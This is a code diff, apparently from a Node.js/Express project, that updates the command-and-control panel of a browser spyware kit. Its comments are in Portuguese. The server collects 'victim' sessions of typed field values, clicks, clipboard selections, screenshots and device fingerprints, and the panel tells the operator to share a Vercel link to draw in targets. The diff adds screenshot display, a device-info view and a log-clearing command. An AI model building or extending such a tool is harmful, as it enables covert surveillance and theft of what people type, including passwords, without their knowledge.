@@ -7,11 +7,10 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Banco de dados em memória
 const sessions = {};
 const adminClients = new Set();
 
-// ---------- SERVE O PAINEL BONITO ----------
+// ---------- PAINEL ----------
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -25,12 +24,11 @@ app.get('/', (req, res) => {
     body {
       background: #0b0d1a;
       color: #e0e5ff;
-      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      font-family: 'Segoe UI', system-ui, sans-serif;
       display: flex;
       height: 100vh;
       overflow: hidden;
     }
-    /* Sidebar */
     .sidebar {
       width: 280px;
       background: #13162b;
@@ -47,7 +45,6 @@ app.get('/', (req, res) => {
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       margin-bottom: 10px;
-      letter-spacing: -0.5px;
     }
     .sidebar .status {
       font-size: 13px;
@@ -102,7 +99,6 @@ app.get('/', (req, res) => {
       font-size: 11px;
       color: #aab4e0;
     }
-    /* Área principal */
     .main {
       flex: 1;
       display: flex;
@@ -115,7 +111,9 @@ app.get('/', (req, res) => {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 20px;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 15px;
     }
     .main-header h2 {
       font-weight: 400;
@@ -123,13 +121,50 @@ app.get('/', (req, res) => {
       color: #bcc6f0;
     }
     .main-header h2 strong { color: #fff; font-weight: 600; }
-    .main-header .info-badge {
+    .main-header .actions {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+    .main-header .actions button {
       background: #1a1f3d;
-      padding: 6px 16px;
+      border: none;
+      color: #aab4e0;
+      padding: 6px 14px;
       border-radius: 30px;
       font-size: 13px;
-      color: #8892c0;
+      cursor: pointer;
+      transition: 0.2s;
     }
+    .main-header .actions button:hover {
+      background: #2a2f55;
+      color: #fff;
+    }
+    .main-header .actions .clear-btn {
+      background: #3d1a2a;
+      color: #ff7b9c;
+    }
+    .main-header .actions .clear-btn:hover {
+      background: #5a1f3a;
+    }
+    .device-info {
+      background: #0e1124;
+      border-radius: 12px;
+      padding: 10px 16px;
+      margin-bottom: 15px;
+      border: 1px solid #1e2346;
+      font-size: 13px;
+      color: #8892c0;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px 24px;
+    }
+    .device-info .item {
+      display: flex;
+      gap: 6px;
+    }
+    .device-info .item .label { color: #4a5580; }
+    .device-info .item .value { color: #d0d9ff; }
     #log-container {
       flex: 1;
       background: #0e1124;
@@ -137,7 +172,7 @@ app.get('/', (req, res) => {
       border: 1px solid #1e2346;
       padding: 15px 20px;
       overflow-y: auto;
-      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-family: 'JetBrains Mono', monospace;
       font-size: 13px;
       line-height: 1.6;
     }
@@ -150,11 +185,24 @@ app.get('/', (req, res) => {
     }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; } }
     .log-entry .time { color: #4a5580; white-space: nowrap; }
-    .log-entry .sess-id { color: #7b8ab8; background: #1a1f3d; padding: 0 8px; border-radius: 4px; font-size: 11px; }
-    .log-entry .content { color: #d0d9ff; word-break: break-all; }
-    .log-entry .type-tag { 
-      background: #2a2f55; padding: 0 10px; border-radius: 12px; font-size: 10px; 
+    .log-entry .type-tag {
+      background: #2a2f55; padding: 0 10px; border-radius: 12px; font-size: 10px;
       text-transform: uppercase; color: #aab4e0; letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+    .log-entry .content { color: #d0d9ff; word-break: break-all; }
+    .log-entry .content img.screenshot-thumb {
+      max-width: 200px;
+      max-height: 150px;
+      border-radius: 8px;
+      border: 1px solid #2a2f55;
+      cursor: pointer;
+      margin-top: 4px;
+      transition: 0.2s;
+    }
+    .log-entry .content img.screenshot-thumb:hover {
+      transform: scale(1.02);
+      border-color: #00f0ff;
     }
     .highlight-input { color: #ffd966; }
     .highlight-click { color: #ff7b9c; }
@@ -165,9 +213,39 @@ app.get('/', (req, res) => {
     ::-webkit-scrollbar-track { background: #0b0d1a; }
     ::-webkit-scrollbar-thumb { background: #2a2f55; border-radius: 10px; }
     .empty-state { color: #3d4670; text-align: center; padding: 40px 0; font-size: 15px; }
+    /* Lightbox para screenshot */
+    .lightbox {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.9);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .lightbox img {
+      max-width: 90%;
+      max-height: 90%;
+      border-radius: 12px;
+      border: 2px solid #2a2f55;
+    }
+    .lightbox.active { display: flex; }
+    .lightbox .close-lb {
+      position: absolute;
+      top: 20px;
+      right: 30px;
+      font-size: 40px;
+      color: #fff;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
+  <div class="lightbox" id="lightbox" onclick="this.classList.remove('active')">
+    <span class="close-lb">&times;</span>
+    <img id="lb-img" src="" alt="Screenshot">
+  </div>
+
   <div class="sidebar">
     <h1>Æ CONTROL</h1>
     <div class="status"><span class="dot"></span> Sistema ativo</div>
@@ -181,8 +259,12 @@ app.get('/', (req, res) => {
   <div class="main">
     <div class="main-header">
       <h2>📡 Monitorando: <strong id="selected-id">Nenhuma</strong></h2>
-      <span class="info-badge" id="event-counter">0 eventos</span>
+      <div class="actions">
+        <span class="info-badge" id="event-counter">0 eventos</span>
+        <button class="clear-btn" id="clear-logs">🗑️ Limpar logs</button>
+      </div>
     </div>
+    <div id="device-info" class="device-info" style="display:none;"></div>
     <div id="log-container">
       <div class="empty-state">Aguardando conexões... <br> Compartilhe seu link do Vercel.</div>
     </div>
@@ -191,15 +273,14 @@ app.get('/', (req, res) => {
   <script>
     const WS_URL = \`wss://\${window.location.host}\`;
     let ws;
-    let currentVictim = null;
-    let allData = {}; // sessId -> [logs]
+    let allData = {};
     let selectedId = null;
 
     function connect() {
       ws = new WebSocket(WS_URL);
       ws.onopen = () => {
         ws.send(JSON.stringify({ type: 'admin' }));
-        console.log('[+] Painel conectado ao servidor');
+        console.log('[+] Painel conectado');
       };
       ws.onmessage = (e) => {
         const msg = JSON.parse(e.data);
@@ -239,6 +320,29 @@ app.get('/', (req, res) => {
       document.getElementById('selected-id').textContent = id;
       renderSidebar();
       renderLogs(id);
+      renderDeviceInfo(id);
+    }
+
+    function renderDeviceInfo(id) {
+      const logs = allData[id] || [];
+      const handshake = logs.find(l => l.type === 'handshake');
+      const div = document.getElementById('device-info');
+      if (handshake && handshake.device) {
+        const d = handshake.device;
+        div.style.display = 'flex';
+        div.innerHTML = \`
+          <span class="item"><span class="label">Plataforma:</span> <span class="value">\${d.platform || '?'}</span></span>
+          <span class="item"><span class="label">Idioma:</span> <span class="value">\${d.language || '?'}</span></span>
+          <span class="item"><span class="label">Tela:</span> <span class="value">\${d.screen || '?'}</span></span>
+          <span class="item"><span class="label">RAM:</span> <span class="value">\${d.deviceMemory || '?'} GB</span></span>
+          <span class="item"><span class="label">Núcleos:</span> <span class="value">\${d.cores || '?'}</span></span>
+          <span class="item"><span class="label">Touch:</span> <span class="value">\${d.touch ? 'Sim' : 'Não'}</span></span>
+          <span class="item"><span class="label">Cookies:</span> <span class="value">\${d.cookies ? 'Ativados' : 'Desativados'}</span></span>
+          <span class="item" style="flex:1; min-width:200px;"><span class="label">User-Agent:</span> <span class="value" style="font-size:11px; word-break:break-all;">\${d.ua || '?'}</span></span>
+        \`;
+      } else {
+        div.style.display = 'none';
+      }
     }
 
     function renderLogs(id) {
@@ -250,19 +354,17 @@ app.get('/', (req, res) => {
         return;
       }
       let html = '';
-      logs.forEach(log => {
-        // CORREÇÃO DA DATA
+      logs.forEach((log, index) => {
         const time = log.timestamp ? new Date(log.timestamp).toLocaleTimeString('pt-BR') : '—';
-
-        // CONTEÚDO MAIS LEGÍVEL POR TIPO
         let content = '';
         let typeClass = '';
         const type = log.type || 'unknown';
+
         if (type === 'handshake') {
           content = \`Nova conexão: \${log.url || 'desconhecida'}\`;
           typeClass = 'highlight-handshake';
         } else if (type === 'input') {
-          content = \`[\${log.name || 'campo'}] = "\${log.value || ''}"\`;
+          content = \`[\${log.name || 'campo'}] = "\${(log.value || '').slice(0, 100)}"\`;
           typeClass = 'highlight-input';
         } else if (type === 'click') {
           content = \`(\${log.x || 0}, \${log.y || 0}) em \${log.target || 'elemento'}\`;
@@ -279,7 +381,12 @@ app.get('/', (req, res) => {
           content = \`Selecionou: "\${(log.text || '').slice(0, 80)}"\`;
           typeClass = 'highlight-clip';
         } else if (type === 'screenshot') {
-          content = \`Captura de tela (\${log.title || 'página'}) - \${log.html_len || 0} bytes\`;
+          if (log.image) {
+            content = \`<img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
+          } else {
+            content = \`Captura de tela (\${log.title || 'página'}) - imagem não disponível\`;
+          }
+          typeClass = '';
         } else {
           content = JSON.stringify(log).slice(0, 120);
         }
@@ -294,6 +401,19 @@ app.get('/', (req, res) => {
       container.scrollTop = container.scrollHeight;
     }
 
+    // Botão limpar logs da vítima selecionada
+    document.getElementById('clear-logs').addEventListener('click', function() {
+      if (!selectedId) return;
+      if (!confirm('Limpar todos os logs de ' + selectedId + '?')) return;
+      if (allData[selectedId]) {
+        allData[selectedId] = [];
+        renderSidebar();
+        renderLogs(selectedId);
+        // Envia comando para o servidor? Não é necessário, mas podemos enviar uma mensagem para limpar no servidor também.
+        ws.send(JSON.stringify({ type: 'clear', sess: selectedId }));
+      }
+    });
+
     connect();
   </script>
 </body>
@@ -301,7 +421,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ---------- WEBSOCKET LÓGICA ----------
+// ---------- WEBSOCKET ----------
 wss.on('connection', (ws) => {
   ws.isAdmin = false;
 
@@ -309,30 +429,39 @@ wss.on('connection', (ws) => {
     try {
       const data = JSON.parse(msg);
       
-      // Admin registra
       if (data.type === 'admin') {
         ws.isAdmin = true;
         adminClients.add(ws);
-        // Envia estado atual
         ws.send(JSON.stringify({ type: 'init', data: sessions }));
         return;
       }
 
-      // Dados de vítima (tem sess)
+      // Comando para limpar logs de uma sessão
+      if (data.type === 'clear' && data.sess) {
+        if (sessions[data.sess]) {
+          sessions[data.sess] = [];
+          // Notifica administradores
+          adminClients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+              client.send(JSON.stringify({ type: 'clear_ack', sess: data.sess }));
+            }
+          });
+        }
+        return;
+      }
+
+      // Dados de vítima
       if (data.sess) {
         if (!sessions[data.sess]) sessions[data.sess] = [];
         sessions[data.sess].push(data);
         
-        // Broadcast para todos os admins
         adminClients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
             client.send(JSON.stringify({ type: 'update', sess: data.sess, ...data }));
           }
         });
       }
-    } catch (e) {
-      // ignora mensagens inválidas
-    }
+    } catch (e) {}
   });
 
   ws.on('close', () => {
